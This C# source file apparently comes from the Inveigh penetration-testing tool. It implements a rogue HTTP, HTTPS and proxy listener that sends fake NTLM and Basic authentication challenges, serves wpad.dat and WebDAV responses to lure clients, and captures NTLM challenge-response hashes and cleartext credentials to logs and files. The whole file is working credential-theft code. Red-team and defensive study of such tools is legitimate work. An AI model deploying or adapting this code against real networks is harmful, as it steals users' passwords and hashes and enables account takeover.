using Quiddity;
using Quiddity.HTTP;
using Quiddity.NTLM;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Net.Security;
using Quiddity.Support;

namespace Inveigh
{
    class HTTPListener
    {
        public const SslProtocols tls12 = (SslProtocols)0x00000C00;

        internal void Start(IPAddress ipAddress, int port, string type)
        {
            TCPListener tcpListener = new TCPListener(ipAddress, port);
            IAsyncResult tcpAsync;       

            try
            {
                tcpListener.Start();

                if (type.Equals("Proxy"))
                {
                    tcpListener.Server.LingerState = new LingerOption(true, 0);
                }

            }
            catch (Exception ex)
            {

                if (ex.Message.ToString().Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                {
                    Output.Queue(string.Format("[!] Failed to start {0} listener on port {1}, check IP and port usage.", type, port));
                }
                else
                {
                    Output.Queue(ex.ToString());

                }
            }

            while (Program.isRunning)
            {
                tcpAsync = tcpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    Thread.Sleep(10);

                    if (!Program.isRunning)
                    {
                        break;
                    }

                }
                while (!tcpAsync.IsCompleted);

                TcpClient tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
                object[] parameters = { tcpClient, type };
                ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
            }

        }

        internal void ReceiveClient(object parameters)
        {
            object[] parameterArray = parameters as object[];
            TcpClient tcpClient = (TcpClient)parameterArray[0];
            string type = (string)parameterArray[1];
            string[] supportedMethods = { "GET", "HEAD", "OPTIONS", "CONNECT", "POST", "PROPFIND" };
            string sourceIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
            string sourcePort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
            string listenerPort = ((IPEndPoint)(tcpClient.Client.LocalEndPoint)).Port.ToString();
            string session = sourceIP + ":" + sourcePort;
            string ntlmChallenge = "";
            int ntlmStage = 0;
            bool proxyIgnoreMatch = false;
            bool wpadAuthIgnoreMatch = false;
            NetworkStream tcpStream = null;
            NetworkStream httpStream = null;
            SslStream httpsStream = null;
            X509Certificate2 certificate = null;
            bool isClientClose = false;

            if (type.Equals("HTTPS"))
            {
                byte[] certificateData = Convert.FromBase64String(Program.argCert);
                certificate = new X509Certificate2(certificateData, Program.argCertPassword, X509KeyStorageFlags.MachineKeySet);
                tcpStream = tcpClient.GetStream();
                httpsStream = new SslStream(tcpStream, false);
            }
            else
            {
                httpStream = tcpClient.GetStream();
            }

            while (tcpClient.Connected && Program.isRunning)
            {
                byte[] requestData = new byte[4096];

                if (type.Equals("HTTPS"))
                {

                    do
                    {
                        Thread.Sleep(100);
                    }
                    while (!tcpStream.DataAvailable && tcpClient.Connected);

                }
                else
                {

                    do
                    {
                        Thread.Sleep(100); // todo check
                    }
                    while (!httpStream.DataAvailable && tcpClient.Connected);

                }

                if (String.Equals(type, "HTTPS"))
                {

                    try
                    {

                        if (!httpsStream.IsAuthenticated)
                        {
                            httpsStream.AuthenticateAsServer(certificate, false, tls12, false);
                        }

                        while (tcpStream.DataAvailable)
                        {
                            httpsStream.Read(requestData, 0, requestData.Length);
                        }

                    }
                    catch (Exception ex)
                    {

                        if (!ex.Message.Contains("A call to SSPI failed, see inner exception."))
                        {
                            Console.WriteLine(ex.Message);
                        }

                    }

                }
                else
                {

                    while (httpStream.DataAvailable)
                    {
                        httpStream.Read(requestData, 0, requestData.Length);
                    }

                }

                HTTPRequest request = new HTTPRequest();

                if (!Utilities.ArrayIsNullOrEmpty(requestData))
                {
                    request.ReadBytes(requestData, 0);
                }

                if (!string.IsNullOrEmpty(request.Method))
                {
                    Output.Queue(String.Format("[.] [{0}] {1}({2}) {3} request from {5}:{6} for {4}", Output.Timestamp(), type, listenerPort, request.Method, request.URI, sourceIP, sourcePort));
                }

                if (!string.IsNullOrEmpty(request.URI))
                {
                    Output.Queue(String.Format("[.] [{0}] {1}({2}) host header {3} from {4}:{5}", Output.Timestamp(), type, listenerPort, request.Host, sourceIP, sourcePort));
                }

                if (!string.IsNullOrEmpty(request.UserAgent))
                {
                    Output.Queue(String.Format("[.] [{0}] {1}({2}) user agent from {3}:{4}:{5}{6}", Output.Timestamp(), type, listenerPort, sourceIP, sourcePort, Environment.NewLine, request.UserAgent));
                }

                if (!string.IsNullOrEmpty(request.Method) && Array.Exists(supportedMethods, element => element == request.Method))
                {

                    HTTPResponse response = new HTTPResponse
                    {
                        Version = "HTTP/1.1",
                        StatusCode = "401",
                        ReasonPhrase = "Unauthorized",
                        Connection = "close",
                        Server = "Microsoft-HTTPAPI/2.0",
                        Date = DateTime.Now.ToString("R"),
                        ContentType = "text/html",
                        ContentLength = "0"
                    };

                    if (!Utilities.ArrayIsNullOrEmpty(Program.argIgnoreAgents) && Program.argWPADAuth.Equals("NTLM"))
                    {

                        foreach (string agent in Program.argIgnoreAgents)
                        {

                            if (request.UserAgent.ToUpper().Contains(agent.ToUpper()))
                            {
                                wpadAuthIgnoreMatch = true;
                            }

                        }

                        if (wpadAuthIgnoreMatch)
                        {
                            Output.Queue(string.Format("[-] [{0}] {1}({2}) switching wpad.dat auth to anonymous due to user agent match from {3}:{4}", Output.Timestamp(), type, listenerPort, sourceIP, sourcePort));
                        }

                    }

                    if (type.Equals("Proxy"))
                    {
                        response.StatusCode = "407";
                        response.ProxyAuthenticate = "NTLM";
                        response.WWWAuthenticate = "";
                        response.Connection = "close";
                    }
                    else if(Program.enabledWebDAV && request.Method.Equals("PROPFIND") && Program.argWebDAVAuth.StartsWith("NTLM"))
                    {
                        response.WWWAuthenticate = "NTLM";
                    }
                    else if (Program.enabledWebDAV && request.Method.Equals("PROPFIND") && Program.argWebDAVAuth.Equals("BASIC"))
                    {
                        response.WWWAuthenticate = string.Concat("Basic realm=", Program.argHTTPRealm);
                    }
                    else if (!string.Equals(request.URI, "/wpad.dat") && string.Equals(Program.argHTTPAuth, "ANONYMOUS") || string.Equals(request.URI, "/wpad.dat") && string.Equals(Program.argWPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch ||
                        (Program.enabledWebDAV && request.Method.Equals("OPTIONS")))
                    {
                        response.StatusCode = "200";
                        response.ReasonPhrase = "OK";
                    }
                    else if ((Program.argHTTPAuth.StartsWith("NTLM") && !string.Equals(request.URI, "/wpad.dat")) || (Program.argWPADAuth.StartsWith("NTLM") && string.Equals(request.URI, "/wpad.dat")))
                    {
                        response.WWWAuthenticate = "NTLM";
                    }
                    else if ((string.Equals(Program.argHTTPAuth, "BASIC") && !string.Equals(request.URI, "/wpad.dat")) || (string.Equals(Program.argWPADAuth, "BASIC") && string.Equals(request.URI, "/wpad.dat")))
                    {
                        response.WWWAuthenticate = string.Concat("Basic realm=", Program.argHTTPRealm);
                    }

                    if ((!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("NTLM ")) || (!string.IsNullOrEmpty(request.ProxyAuthorization)) && request.ProxyAuthorization.ToUpper().StartsWith("NTLM "))
                    {
                        string authorization = request.Authorization;

                        if (!string.IsNullOrEmpty(request.ProxyAuthorization))
                        {
                            authorization = request.ProxyAuthorization;
                        }

                        NTLMNegotiate ntlm = new NTLMNegotiate();
                        ntlm.ReadBytes(Convert.FromBase64String(authorization.Substring(5, authorization.Length - 5)), 0);

                        if (ntlm.MessageType == 1)
                        {
                            byte[] timestamp = BitConverter.GetBytes(DateTime.Now.ToFileTime());
                            NTLMChallenge challenge = new NTLMChallenge(Program.argChallenge, Program.netbiosDomain, Program.computerName, Program.dnsDomain, Program.computerName, Program.dnsDomain);
                            byte[] challengeData = challenge.GetBytes(Program.computerName);
                            ntlmChallenge = BitConverter.ToString(challenge.ServerChallenge).Replace("-", "");
                            string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
                            Program.httpSessionTable[sessionTimestamp] = ntlmChallenge;
                            Output.Queue(String.Format("[+] [{0}] {1}({2}) NTLM challenge [{3}] sent to {4}:{5}", Output.Timestamp(), type, listenerPort, ntlmChallenge, sourceIP, sourcePort));

                            if (String.Equals(type, "Proxy"))
                            {
                                response.StatusCode = "407";
                                response.ProxyAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
                            }
                            else
                            {
                                response.WWWAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
                            }

                            response.Connection = "";
                        }
                        else if (ntlm.MessageType == 3)
                        {
                            response.StatusCode = "200";
                            response.ReasonPhrase = "OK";
                            ntlmStage = 3;
                            isClientClose = true;
                            NTLMResponse ntlmResponse = new NTLMResponse(Convert.FromBase64String(authorization.Substring(5, authorization.Length - 5)), false);
                            string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
                            string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
                            string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
                            string ntlmResponseHash = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
                            string lmResponseHash = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");

                            if (string.IsNullOrEmpty(ntlmChallenge)) // NTLMv2 workaround to track sessions over different ports without a cookie
                            {
                                byte[] timestamp = new byte[8];
                                Buffer.BlockCopy(ntlmResponse.NtChallengeResponse, 24, timestamp, 0, 8);
                                string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
                                ntlmChallenge = Program.httpSessionTable[sessionTimestamp].ToString();
                            }

                            Output.NTLMOutput(user, domain, ntlmChallenge, ntlmResponseHash, sourceIP, host, type, listenerPort, sourcePort, lmResponseHash);                               

                            if (type.Equals("Proxy"))
                            {

                                if (!string.IsNullOrEmpty(Program.argHTTPResponse))
                                {
                                    response.CacheControl = "no-cache, no-store";
                                }

                            }

                        }

                    }
                    else if (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC "))
                    {
                        response.StatusCode = "200";
                        response.ReasonPhrase = "OK";
                        string httpHeaderAuthorizationBase64 = request.Authorization.Substring(6, request.Authorization.Length - 6);
                        string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorizationBase64));

                        lock (Program.cleartextList)
                        {
                            Program.cleartextList.Add(string.Concat(sourceIP, " ", cleartextCredentials));
                        }

                        Output.Queue(string.Format("[+] [{0}] {1}({2}) Basic authentication [cleartext credentials] captured from {3}({4}):\r\n{5}", Output.Timestamp(), type, listenerPort, sourceIP, sourcePort, cleartextCredentials));

                        if (Program.enabledFileOutput)
                        {

                            lock (Program.cleartextFileList)
                            {
                                Program.cleartextFileList.Add(string.Concat(sourceIP, ",", cleartextCredentials));
                            }

                            Output.Queue(string.Format("[!] [{0}] {1}({2}) Basic authentication cleartext credentials written to {3}", Output.Timestamp(), type, listenerPort, String.Concat(Program.argFilePrefix, "-Cleartext.txt")));
                        }

                    }

                    if (!string.IsNullOrEmpty(Program.argWPADResponse) && !proxyIgnoreMatch && string.Equals(request.URI, "/wpad.dat"))
                    {
                        response.ContentType = "application/x-ns-proxy-autoconfig";
                        response.Message = Encoding.UTF8.GetBytes(Program.argWPADResponse);
                    }
                    else if (!string.IsNullOrEmpty(Program.argHTTPResponse))
                    {
                        response.Message = Encoding.UTF8.GetBytes(Program.argHTTPResponse);
                    }

                    if (Program.enabledWebDAV)
                    {

                        if (request.Method.Equals("OPTIONS"))
                        {
                            response.StatusCode = "200";
                            response.ReasonPhrase = "OK";
                            response.Allow = "OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK";
                            response.Public = "OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK";
                            response.DAV = "1,2,3";
                            response.Author = "DAV";
                        }
                        else if (request.Method.Equals("PROPFIND"))
                        {
                            DateTime currentTime = DateTime.Now;
                            response.Message = Encoding.UTF8.GetBytes("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\">\r\n<HTML><HEAD><TITLE>Not Authorized</TITLE>\r\n<META HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"></HEAD>\r\n<BODY><h2>Not Authorized</h2>\r\n<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>\r\n</BODY></HTML>\r\n");
                            response.Connection = "";

                            if (ntlmStage == 3 || (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC ")) || Program.argHTTPAuth.Equals("ANONYMOUS"))
                            {
                                response.Connection = "close";

                                if (!request.URI.Contains("."))
                                {
                                    response.ContentType = "text/xml";
                                    response.Message = Encoding.UTF8.GetBytes("<?xml version=\"1.0\" encoding=\"utf-8\"?><D:multistatus xmlns:D=\"DAV:\"><D:response><D:href>http://" + sourceIP + request.URI + "</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>" + currentTime.ToString("R") + "</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>webdav</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>" + currentTime.ToString("yyyy-MM-ddThh:mm:ss.fffZ") + "</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>");
                                }
                                else
                                {
                                    response.ContentType = "text/plain";
                                }

                            }

                        }

                    }

                    byte[] buffer = response.GetBytes();

                    if (type.Equals("HTTPS") && httpsStream.CanRead)
                    {
                        httpsStream.Write(buffer, 0, buffer.Length);
                        httpsStream.Flush();
                    }
                    else if (httpStream.CanRead)
                    {
                        httpStream.Write(buffer, 0, buffer.Length);
                        httpStream.Flush();
                    }

                    if (isClientClose)
                    {

                        if (type.Equals("Proxy"))
                        {
                            tcpClient.Client.Close();
                        }
                        else
                        {
                            tcpClient.Close();
                        }

                    }

                }

            }

        }

    }

}
